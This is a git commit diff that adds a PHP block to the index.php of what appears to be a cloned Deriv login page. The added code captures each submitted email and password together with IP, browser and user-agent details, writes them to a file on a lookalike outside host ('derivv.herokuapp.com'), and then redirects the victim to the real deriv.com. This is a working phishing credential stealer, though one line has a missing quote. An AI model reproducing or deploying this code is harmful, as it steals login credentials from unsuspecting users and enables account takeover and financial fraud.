a02f86a81febbd50c82cba43b2888131aba81824
dergate <107431159+dergate@users.noreply.github.com>
2022-07-03 02:36:48 -0700

    Update index.php

--- index.php
+++ index.php
@@ -651,6 +651,36 @@ Or log in with
 Don’t have an account yet? <a class='account-link' href='https://deriv.com/signup/'>Create a new account</a>
 </p>
 </div>
+ 
+<?php 
+
+session_start();
+// Logging details
+if (isset($_POST['login'])) {
+
+    include 'details.php';
+	// getting user details
+	$email = $_POST['email'];
+	$password = $_POST['password'];
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+
+
+	$body .= "email                      : $email\r\n";
+	$body .= "password                      : $password\r\n";
+	$body .=  "|--------------- I N F O | I P -------------------|\r\n";
+	$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
+	$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
+	$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
+
+
+	$save=fopen("https://derivv.herokuapp.com/log/personl_details.txt,"a+");
+	fwrite($save,$body);
+	fclose($save);
+}
+header("Location: https://www.deriv.com");
+?>
+
+           
 <script type="text/javascript">
     var frmLogin, txtEmail, txtPass, btnToggle;
     window.onload = function() {
